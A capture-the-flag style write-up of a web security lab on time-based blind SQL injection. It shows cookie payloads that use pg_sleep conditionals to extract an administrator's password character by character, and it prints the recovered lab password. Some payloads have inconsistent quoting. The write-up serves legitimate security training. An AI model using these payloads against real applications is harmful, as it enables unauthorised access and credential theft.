# Problem Statement

This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie. The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows or causes an error. However, since the query is executed synchronously, it is possible to trigger conditional time delays to infer information. The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user. To solve the lab, log in as the administrator user. 

# Solution

In Burp Suite's Repeater tool, send the following query to the server and observe the time delay:

```
TrackingId='Abc...Xyz' SELECT pg_sleep(10)--'
```

This confirms that SQL injection is possible and that the server is running a Postgres database. We will use the pg_sleep function to induce sleep and structure conditionals using Postgres syntax. Since our objective is to login as the administrator, we should exploit the time delay to enumerate the administrator's password with a query like the following:

```
TrackingId='Abc...Xyz' SELECT CASE WHEN (CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END--'
```

Using SUBSTRING and a subquery within the conditional, we can enumerate the password as follows:

```
TrackingId='Abc...Xyz''; SELECT CASE WHEN (SUBSTRING((SELECT password FROM users WHERE username='administrator'), 1, 1) > 'm') THEN pg_sleep(10) ELSE pg_sleep(0) END--
```

This first query induces sleep on the server, telling us that the first character of the administrator's password is greater than 'm'. We then modify the query to compare the character to 't', and find that the character is also greater than 't'. 
 
```
TrackingId='Abc...Xyz''; SELECT CASE WHEN (SUBSTRING((SELECT password FROM users WHERE username='administrator'), 1, 1) > 't') THEN pg_sleep(10) ELSE pg_sleep(0) END--
```

Subsequently, the query is modified to check if the first character of the administrator's password is greater than 'w'. This query does not induce sleep, indicating the first character is less than or equal to 'w'.

```
TrackingId='Abc...Xyz''; SELECT CASE WHEN (SUBSTRING((SELECT password FROM users WHERE username='administrator'), 1, 1) > 'w') THEN pg_sleep(10) ELSE pg_sleep(0) END--
```

We then send another query to check if the first character is greater than 'v', the character directly preceding 'w' in value. This query induces sleep, indicating the first character is greater than 'v'. Because the character is greater than 'v', but not greater than 'w', the character is 'w'. 

```
TrackingId='Abc...Xyz''; SELECT CASE WHEN (SUBSTRING((SELECT password FROM users WHERE username='administrator'), 1, 1) > 'v') THEN pg_sleep(10) ELSE pg_sleep(0) END--
```

Note: This is a demonstration of password enumeration using a modified binary search method. You should mirror the general methodology while expecting a different password. 

We repeat this method for the next character:

```
TrackingId='Abc...Xyz''; SELECT CASE WHEN (SUBSTRING((SELECT password FROM users WHERE username='administrator'), 2, 1) > 'm') THEN pg_sleep(10) ELSE pg_sleep(0) END--
```

The above query does not induce sleep, which tells us the second character is less than or equal to 'm'. Next, we modify the query to compare the second character to 'h':

```
TrackingId='Abc...Xyz''; SELECT CASE WHEN (SUBSTRING((SELECT password FROM users WHERE username='administrator'), 2, 1) > 'h') THEN pg_sleep(10) ELSE pg_sleep(0) END--
```

This query causes a delayed response, indicating the second character is greater than 'h', and less than or equal to 'm'. We then compare the second character to 'k':

```
TrackingId='Abc...Xyz''; SELECT CASE WHEN (SUBSTRING((SELECT password FROM users WHERE username='administrator'), 2, 1) > 'k') THEN pg_sleep(10) ELSE pg_sleep(0) END--
```

This query also induces sleep, so the second character is 'l' or 'm'. Modifying the query compare the character to 'l' does not induce sleep, indicating the character is less than or equal to 'l'. If the second character is greater than 'k', but less than or equal to 'l', then the character is equal to 'l'. We can verify this by changing the greater than operator (>) to an equal operator (=):

```
TrackingId='Abc...Xyz''; SELECT CASE WHEN (SUBSTRING((SELECT password FROM users WHERE username='administrator'), 2, 1) = 'l') THEN pg_sleep(10) ELSE pg_sleep(0) END--
```

The query induces sleep, proving the second character is 'l'. 

Repeat this process until every character in the password has been enumerated, and log in as the administrator. The password identified for this example is 'wl4t6rj74odiy8979mrx'. Note the response time in for this query:

```
TrackingId='AbC...xYz'; SELECT CASE WHEN (SUBSTRING((SELECT password FROM users WHERE username='administrator'), 1, 20) = 'wl4t6rj74odiy8979mrx') THEN pg_sleep(3) ELSE pg_sleep(0) END--
```

![Screen Shot 2023-08-03 at 5 46 19 PM](https://github.com/SaturnineTitan/WebSecurityAcademy/assets/43506369/e8382530-c29a-461a-a9e5-f3acf2893f77)

We then use this password to log in as the administrator, solving the lab. 
